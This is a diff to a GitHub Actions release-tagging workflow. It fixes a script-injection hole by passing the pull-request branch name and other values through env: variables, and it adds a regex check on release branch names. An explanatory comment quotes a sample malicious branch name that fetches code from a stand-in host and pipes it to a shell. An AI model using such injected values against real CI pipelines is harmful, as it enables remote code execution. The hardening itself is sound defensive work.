@@ -27,11 +27,29 @@ jobs:
           fetch-depth: 0
           ref: main
 
+      # HEAD_REF (a PR branch name) is attacker-controlled: anyone who can
+      # push a branch and open a PR into main controls this string, and a
+      # git branch name may contain shell metacharacters ($, `, ;, quotes,
+      # ...). It's passed via env: rather than spliced into the script
+      # text with ${{ }} -- that splicing happens at YAML-templating time,
+      # before bash ever parses the line, so a value like
+      # "release/v9.9.9$(curl evil|sh)" would execute as a command
+      # substitution if interpolated directly; routed through env: and
+      # referenced as "$HEAD_REF", it's just a string value to bash, no
+      # matter what it contains. The regex check below is a second,
+      # independent layer on top of that -- reject anything that isn't
+      # actually a well-formed release branch name before it's used again
+      # in later steps.
       - name: Extract the version from the release branch name
         id: meta
+        env:
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
-          branch="${{ github.event.pull_request.head.ref }}"
-          echo "tag=${branch#release/}" >> "$GITHUB_OUTPUT"
+          if [[ ! "$HEAD_REF" =~ ^release/v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "release branch name '$HEAD_REF' is not a well-formed release/vX.Y.Z name" >&2
+            exit 1
+          fi
+          echo "tag=${HEAD_REF#release/}" >> "$GITHUB_OUTPUT"
 
       # A squash/merge/rebase merge creates a brand new commit on main --
       # its own "Build, vet & test" push-triggered run (ci.yml) is a
@@ -44,8 +62,9 @@ jobs:
       - name: Wait for the merge commit's own CI on main
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MERGE_SHA: ${{ github.event.pull_request.merge_commit_sha }}
         run: |
-          sha="${{ github.event.pull_request.merge_commit_sha }}"
+          sha="$MERGE_SHA"
           for i in $(seq 1 60); do
             result=$(gh api "repos/${{ github.repository }}/commits/$sha/check-runs" \
               --jq '[.check_runs[] | select(.name == "Build, vet & test")][0] | "\(.status) \(.conclusion)"' 2>/dev/null || echo "missing missing")
@@ -65,20 +84,22 @@ jobs:
           exit 1
 
       - name: Tag the merge commit
+        env:
+          TAG: ${{ steps.meta.outputs.tag }}
+          MERGE_SHA: ${{ github.event.pull_request.merge_commit_sha }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git tag -a "${{ steps.meta.outputs.tag }}" \
-            "${{ github.event.pull_request.merge_commit_sha }}" \
-            -m "Release ${{ steps.meta.outputs.tag }}"
-          git push origin "${{ steps.meta.outputs.tag }}"
+          git tag -a "$TAG" "$MERGE_SHA" -m "Release $TAG"
+          git push origin "$TAG"
 
       - name: Trigger release.yml for the new tag
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.meta.outputs.tag }}
         run: |
           # A tag pushed with the default GITHUB_TOKEN (the step above)
           # deliberately does NOT trigger another workflow's push trigger --
           # dispatch release.yml explicitly instead. See release.yml's own
           # workflow_dispatch trigger comment.
-          gh workflow run release.yml --ref "${{ steps.meta.outputs.tag }}"
+          gh workflow run release.yml --ref "$TAG"
